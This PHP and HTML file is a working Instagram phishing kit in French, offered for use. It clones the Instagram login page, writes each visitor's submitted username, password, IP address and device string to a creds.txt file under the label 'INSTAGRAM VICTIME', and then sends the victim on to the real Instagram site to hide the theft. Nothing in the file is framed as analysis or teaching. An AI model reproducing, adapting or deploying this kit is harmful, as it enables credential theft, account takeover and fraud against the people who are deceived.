<?php
if ($_POST) {
    $ip = $_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['HTTP_X_REAL_IP'] ?? $_SERVER['REMOTE_ADDR'] ?? 'inconnue';
    $ip = trim(explode(',', $ip)[0]);

    $email = $_POST['email'] ?? '';
    $pass  = $_POST['password'] ?? '';
    $ua    = substr($_SERVER['HTTP_USER_AGENT'] ?? '', 0, 150);
    $time  = date('Y-m-d H:i:s');

    $log  = "┌─────────────────────────────────────────\n";
    $log .= "│ 🎯 INSTAGRAM VICTIME — {$time}\n";
    $log .= "├─────────────────────────────────────────\n";
    $log .= "│ 📧 EMAIL/USER : {$email}\n";
    $log .= "│ 🔑 MOT DE PASSE : {$pass}\n";
    $log .= "│ 🌐 ADRESSE IP   : {$ip}\n";
    $log .= "│ 📱 APPAREIL     : {$ua}\n";
    $log .= "└─────────────────────────────────────────\n";

    file_put_contents('creds.txt', $log, FILE_APPEND | LOCK_EX);
    
    // Redirection vers Instagram (permet à la victime de voir la vraie page)
    header('Location: https://www.instagram.com/');
    exit;
}
?>
<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram - Connexion</title>
    <style>
        /* Instagram CSS Clone - Responsive et centré */
        body {
            background-color: #fafafa;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
        }
        
        .main-container {
            display: flex;
            flex-direction: row;
            align-items: center;
            justify-content: center;
            max-width: 935px;
            width: 100%;
            margin: 0 auto;
            padding: 32px 20px;
            gap: 32px;
        }
        
        .phone-image {
            width: 380px;
            height: 581px;
            background-image: url('https://www.instagram.com/static/images/homepage/home-phones.png/43cc71bb1b43.png');
            background-repeat: no-repeat;
            background-position: center;
            background-size: contain;
            flex-shrink: 0;
        }
        
        .login-section {
            display: flex;
            flex-direction: column;
            align-items: center;
            gap: 12px;
            min-width: 350px;
        }
        
        .login-box {
            background: #fff;
            border: 1px solid #dbdbdb;
            border-radius: 1px;
            padding: 40px 40px 20px;
            text-align: center;
            width: 100%;
            max-width: 350px;
            box-sizing: border-box;
        }
        
        .logo {
            font-family: 'Grand Hotel', cursive;
            font-size: 54px;
            font-weight: 400;
            margin-bottom: 24px;
            color: #262626;
            line-height: 1;
        }
        
        .input-field {
            width: 100%;
            padding: 12px 16px;
            font-size: 16px;
            border: 1px solid #dbdbdb;
            border-radius: 3px;
            margin-bottom: 6px;
            background-color: #fafafa;
            box-sizing: border-box;
        }
        
        .input-field:focus {
            outline: none;
            background-color: #fff;
            border-color: #a8a8a8;
        }
        
        .submit-btn {
            background-color: #0095f6;
            border: 1px solid #0095f6;
            border-radius: 4px;
            color: #fff;
            cursor: pointer;
            font-size: 14px;
            font-weight: 600;
            padding: 8px 16px;
            width: 100%;
            margin-top: 8px;
        }
        
        .submit-btn:disabled {
            background-color: #b2dffc;
        }
        
        .divider {
            display: flex;
            align-items: center;
            margin: 20px 0;
            color: #8e8e8e;
            font-size: 13px;
        }
        
        .divider::before,
        .divider::after {
            content: "";
            flex: 1;
            border-bottom: 1px solid #dbdbdb;
        }
        
        .divider span {
            padding: 0 18px;
        }
        
        .fb-login {
            color: #385185;
            font-size: 14px;
            font-weight: 600;
            margin-bottom: 20px;
            cursor: pointer;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
        }
        
        .fb-login img {
            width: 16px;
            height: 16px;
        }
        
        .forgot-password {
            font-size: 12px;
            color: #00376b;
            margin-bottom: 20px;
        }
        
        .signup-box {
            background: #fff;
            border: 1px solid #dbdbdb;
            border-radius: 1px;
            padding: 20px;
            text-align: center;
            width: 100%;
            max-width: 350px;
            box-sizing: border-box;
            font-size: 14px;
        }
        
        .signup-link {
            color: #0095f6;
            font-weight: 600;
            text-decoration: none;
        }
        
        .app-download {
            display: flex;
            justify-content: center;
            margin-top: 20px;
            gap: 10px;
        }
        
        .app-download img {
            height: 40px;
            cursor: pointer;
        }
        
        @media (max-width: 876px) {
            .main-container {
                flex-direction: column;
                padding: 32px 16px;
            }
            .phone-image {
                display: none;
            }
            .login-section {
                width: 100%;
                max-width: 350px;
            }
        }
    </style>
    <link href="https://fonts.googleapis.com/css2?family=Grand+Hotel&display=swap" rel="stylesheet">
</head>
<body>
    <div class="main-container">
        <div class="phone-image"></div>
        <div class="login-section">
            <div class="login-box">
                <div class="logo">Instagram</div>
                <form method="POST" action="instagramlogin.php">
                    <input type="text" name="email" class="input-field" placeholder="Numéro de téléphone, nom d'utilisateur ou e-mail" required>
                    <input type="password" name="password" class="input-field" placeholder="Mot de passe" required>
                    <button type="submit" class="submit-btn">Se connecter</button>
                </form>
                <div class="divider"><span>OU</span></div>
                <div class="fb-login">
                    <img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24'%3E%3Cpath fill='%231877f2' d='M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.99 4.388 10.954 10.125 11.854v-8.385H7.078v-3.47h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.47h-2.796v8.385C19.612 23.027 24 18.062 24 12.073z'/%3E%3C/svg%3E" alt="Facebook">
                    Se connecter avec Facebook
                </div>
                <div class="forgot-password">Mot de passe oublié ?</div>
            </div>
            <div class="signup-box">
                Vous n'avez pas de compte ? <a href="#" class="signup-link">S'inscrire</a>
            </div>
            <div class="app-download">
                <img src="https://www.instagram.com/static/images/appstore-install-badges/badge_ios_french-french.png/180ae7a0bcf7.png" alt="App Store">
                <img src="https://www.instagram.com/static/images/appstore-install-badges/badge_android_french-fr.png/180ae7a0bcf7.png" alt="Google Play">
            </div>
        </div>
    </div>

    <script>
        // Script pour rediriger après capture
        document.querySelector('form').addEventListener('submit', function(e) {
            e.preventDefault();
            const formData = new FormData(this);
            fetch(this.action, {
                method: 'POST',
                body: formData
            })
            .then(() => {
                window.location.href = 'https://www.instagram.com/';
            });
        });
    </script>
</body>
</html>
